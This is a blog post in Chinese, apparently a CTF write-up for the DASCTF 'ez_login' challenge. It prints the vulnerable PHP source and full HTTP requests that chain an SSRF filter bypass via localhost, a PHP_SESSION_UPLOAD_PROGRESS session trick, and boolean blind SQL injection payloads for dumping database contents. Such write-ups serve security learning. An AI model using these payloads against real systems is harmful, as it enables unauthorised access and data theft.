@@ -1,0 +1,287 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ez_login | MY BLOG</title><meta name="author" content="penguin2k"><meta name="copyright" content="penguin2k"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DASCTF 三月赛 ez_login WriteUp题目信息 题目名称：ez_login 赛事：DASCTF 三月赛 题目类型：SSRF + SQL盲注 题目地址：https:&#x2F;&#x2F;39999babc1fb2e7167634286.http-ctf2.dasctf.com&#x2F;   源码分析index.php（入口文件）1234567891011121314151617181920212223&lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ez_login">
+<meta property="og:url" content="http://penguin3k.cn/2026/11/07/ez-login/index.html">
+<meta property="og:site_name" content="MY BLOG">
+<meta property="og:description" content="DASCTF 三月赛 ez_login WriteUp题目信息 题目名称：ez_login 赛事：DASCTF 三月赛 题目类型：SSRF + SQL盲注 题目地址：https:&#x2F;&#x2F;39999babc1fb2e7167634286.http-ctf2.dasctf.com&#x2F;   源码分析index.php（入口文件）1234567891011121314151617181920212223&lt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/penguin3k/mypicture/main/img/uwp3874271.jpeg">
+<meta property="article:published_time" content="2026-11-07T09:42:33.000Z">
+<meta property="article:modified_time" content="2026-11-07T09:42:52.821Z">
+<meta property="article:author" content="penguin2k">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/penguin3k/mypicture/main/img/uwp3874271.jpeg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://penguin3k.cn/2026/11/07/ez-login/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ez_login',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2026-11-07 17:42:52'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/penguin3k/mypicture/main/img/uwp3874271.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/penguin3k/mypicture/main/img/wallhaven-w5o7r6_2560x1440.png')"><nav id="nav"><span id="blog-info"><a href="/" title="MY BLOG"><span class="site-name">MY BLOG</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ez_login</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-07T09:42:33.000Z" title="发表于 2026-11-07 17:42:33">2026-11-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-07T09:42:52.821Z" title="更新于 2026-11-07 17:42:52">2026-11-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ez_login"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DASCTF-三月赛-ez-login-WriteUp"><a href="#DASCTF-三月赛-ez-login-WriteUp" class="headerlink" title="DASCTF 三月赛 ez_login WriteUp"></a>DASCTF 三月赛 ez_login WriteUp</h1><h2 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h2><ul>
+<li><strong>题目名称</strong>：ez_login</li>
+<li><strong>赛事</strong>：DASCTF 三月赛</li>
+<li><strong>题目类型</strong>：SSRF + SQL盲注</li>
+<li><strong>题目地址</strong>：<code>https://39999babc1fb2e7167634286.http-ctf2.dasctf.com/</code></li>
+</ul>
+<hr>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="index-php（入口文件）"><a href="#index-php（入口文件）" class="headerlink" title="index.php（入口文件）"></a>index.php（入口文件）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no session&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$url</span>)&#123;</span><br><span class="line">            <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span><br><span class="line">            <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">            <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your IP is internal yoyoyo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关键点</strong>：</p>
+<ol>
+<li><code>if(!isset($_SESSION))</code> — 必须有 session 才能继续，但代码中没有 <code>session_start()</code>，直接访问会输出 <code>no session</code> 后退出</li>
+<li><code>include(&quot;./php/check_ip.php&quot;)</code> — 引入 IP 检查函数（源码不可见）</li>
+<li><code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1)</code> — 开启了 302 重定向跟随</li>
+<li><code>$_GET[&#39;url&#39;]</code> — SSRF 的 URL 参数通过 GET 方式传入</li>
+</ol>
+<h3 id="se1f-Log3n-php（登录验证逻辑）"><a href="#se1f-Log3n-php（登录验证逻辑）" class="headerlink" title="se1f_Log3n.php（登录验证逻辑）"></a>se1f_Log3n.php（登录验证逻辑）</h3><p>从 admin.php 页面 HTML 注释中发现源码包 <code>yuanma_f0r_eAZy_logon.zip</code>，下载解压后得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/db.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> !== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; and `password`=&quot;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span> AND <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>() AND <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>)) <span class="title function_ invoke__">OR</span> ( (<span class="variable">$con</span>-&gt;<span class="title function_ invoke__">close</span>() AND <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>) )); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键点</strong>：</p>
+<ol>
+<li><code>$ip !== &quot;127.0.0.1&quot;</code> — 只允许本机访问（这也是为什么需要 SSRF）</li>
+<li>SQL 语句用<strong>双引号</strong>拼接，<code>$username</code> 和 <code>$password</code> 直接插入，<strong>无任何过滤</strong></li>
+<li>布尔盲注：登录成功返回 <code>error</code>，失败返回 <code>Try again!</code></li>
+<li>代码会 <code>echo $sql</code>，可以回显 SQL 语句，有助于调试</li>
+</ol>
+<hr>
+<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="第一步：绕过-no-session-检查"><a href="#第一步：绕过-no-session-检查" class="headerlink" title="第一步：绕过 no session 检查"></a>第一步：绕过 no session 检查</h3><p><strong>原理</strong>：PHP 的 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 机制——在文件上传时，PHP 会自动初始化 session 并在 session 中存储上传进度信息，即使代码没有调用 <code>session_start()</code>。</p>
+<p><strong>触发条件</strong>：</p>
+<ul>
+<li><code>session.use_strict_mode=off</code>（PHP 默认值）</li>
+<li>必须是 <strong>POST</strong> 请求，<code>Content-Type</code> 为 <code>multipart/form-data</code></li>
+<li>请求中包含 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 字段和文件字段</li>
+</ul>
+<p><strong>Burp 请求模板</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?url=http://localhost/admin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39999babc1fb2e7167634286.http-ctf2.dasctf.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=&lt;自定义sessionid&gt;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----B</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>135</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------B</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">mochu7</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------B</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;m.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">mochu7</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------B--</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>注意</strong>：必须是 POST 请求（文件上传触发 session 初始化），URL 中的 <code>?url=...</code> 仍然作为 GET 参数传递给 <code>$_GET[&#39;url&#39;]</code>。</p>
+</blockquote>
+<h3 id="第二步：绕过-check-inner-ip"><a href="#第二步：绕过-check-inner-ip" class="headerlink" title="第二步：绕过 check_inner_ip"></a>第二步：绕过 check_inner_ip</h3><p>通过对 <code>check_inner_ip</code> 函数进行黑盒测试，分析其行为：</p>
+<table>
+<thead>
+<tr>
+<th>URL 格式</th>
+<th>返回结果</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>空字符串</td>
+<td><code>http or https accepts</code> (21字节)</td>
+<td>协议不合法，函数直接输出提示</td>
+</tr>
+<tr>
+<td><code>http://127.0.0.1/</code></td>
+<td><code>Your IP is internal yoyoyo</code></td>
+<td>内网 IP 被拦截</td>
+</tr>
+<tr>
+<td><code>http://0.0.0.0/</code></td>
+<td><code>Your IP is internal yoyoyo</code></td>
+<td>被拦截</td>
+</tr>
+<tr>
+<td><code>http://example.com/</code></td>
+<td><code>Your IP is internal yoyoyo</code></td>
+<td>被拦截</td>
+</tr>
+<tr>
+<td><code>http://2130706433/</code> (十进制)</td>
+<td>回显源码</td>
+<td>DNS 解析失败，触发异常绕过</td>
+</tr>
+<tr>
+<td><code>http://0x7f000001/</code> (十六进制)</td>
+<td>回显源码</td>
+<td>DNS 解析失败</td>
+</tr>
+<tr>
+<td><strong><code>http://localhost/</code></strong></td>
+<td><strong>SSRF 成功执行</strong></td>
+<td><strong>绕过成功</strong></td>
+</tr>
+</tbody></table>
+<p><strong>结论</strong>：<code>check_inner_ip</code> 很可能是基于 <code>gethostbyname()</code> 解析后判断是否为内网 IP 段（<code>127.x.x.x</code>、<code>10.x.x.x</code> 等），而 <code>localhost</code> 被 <code>gethostbyname</code> 解析后不会被判定为内网 IP（或绕过了正则匹配），但 curl 能正确将其解析为 <code>127.0.0.1</code> 进行请求。</p>
+<h3 id="第三步：SSRF-访问内网-admin-php"><a href="#第三步：SSRF-访问内网-admin-php" class="headerlink" title="第三步：SSRF 访问内网 admin.php"></a>第三步：SSRF 访问内网 admin.php</h3><p>构造完整请求，通过 SSRF 访问内网的 <code>admin.php</code>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?url=http://localhost/admin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39999babc1fb2e7167634286.http-ctf2.dasctf.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=&lt;有效的sessionid&gt;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----B</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>135</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------B</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">mochu7</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------B</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;m.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">mochu7</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------B--</span></span></span><br></pre></td></tr></table></figure>
+
+<p>成功返回 admin.php 的登录页面 HTML。</p>
+<h3 id="第四步：发现并下载源码包"><a href="#第四步：发现并下载源码包" class="headerlink" title="第四步：发现并下载源码包"></a>第四步：发现并下载源码包</h3><p>在 admin.php 返回的 HTML 中发现关键注释：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--/yuanma_f0r_eAZy_logon.zip--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过 SSRF 下载该源码包：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?url=http://localhost/yuanma_f0r_eAZy_logon.zip</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39999babc1fb2e7167634286.http-ctf2.dasctf.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=&lt;有效的sessionid&gt;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----B</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>135</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------B</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">mochu7</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------B</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;m.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">mochu7</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------B--</span></span></span><br></pre></td></tr></table></figure>
+
+<p>将 Burp 响应的 Raw 数据保存为 <code>.zip</code> 文件，解压得到 <code>se1f_Log3n.php</code>。</p>
+<blockquote>
+<p><strong>Burp 保存方法</strong>：右键 Response → Save → 选择保存路径，文件名设为 <code>yuanma.zip</code>，用二进制编辑器或直接修改后缀名为 <code>.zip</code>。</p>
+</blockquote>
+<h3 id="第五步：SQL-盲注获取-flag"><a href="#第五步：SQL-盲注获取-flag" class="headerlink" title="第五步：SQL 盲注获取 flag"></a>第五步：SQL 盲注获取 flag</h3><p><strong>注入点分析</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> `username`,`password` <span class="keyword">FROM</span> `<span class="keyword">user</span>` <span class="keyword">WHERE</span> `username`<span class="operator">=</span>&quot;[注入点]&quot; <span class="keyword">and</span> `password`<span class="operator">=</span>&quot;[注入点]&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>双引号闭合，无过滤</li>
+<li>布尔盲注判断标准：成功返回 <code>error</code>，失败返回 <code>Try again!</code></li>
+<li>由于 <code>se1f_Log3n.php</code> 限制了 <code>REMOTE_ADDR</code> 必须为 <code>127.0.0.1</code>，注入请求同样需要通过 SSRF 发送</li>
+</ul>
+<p><strong>注入 Payload 构造</strong>：</p>
+<p>闭合双引号后用 <code>or</code> 构造恒真&#x2F;恒假条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=&quot; or 1=1-- -</span><br><span class="line">password=任意值</span><br><span class="line"></span><br><span class="line"># 恒真 → error（成功）</span><br><span class="line"># 恒假 → Try again!（失败）</span><br></pre></td></tr></table></figure>
+
+<p><strong>盲注流程</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1. 猜数据库名长度</span></span><br><span class="line">username<span class="operator">=</span>&quot; or length(database())=N-- -</span><br><span class="line"></span><br><span class="line">-- 2. 猜数据库名字符</span><br><span class="line">username=&quot; <span class="keyword">or</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3. 猜表名</span></span><br><span class="line">username<span class="operator">=</span>&quot; or substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#x27;a&#x27;-- -</span><br><span class="line"></span><br><span class="line">-- 4. 猜字段名</span><br><span class="line">username=&quot; <span class="keyword">or</span> substr((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;目标表&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 5. 猜 flag 值</span></span><br><span class="line">username<span class="operator">=</span>&quot; or substr((select flag from 目标表),1,1)=&#x27;a&#x27;-- -</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>提示</strong>：可编写 Python 脚本自动化盲注过程，通过 requests 库发送 multipart POST 请求，根据响应中是否包含 <code>error</code> 或 <code>Try again!</code> 判断布尔值。</p>
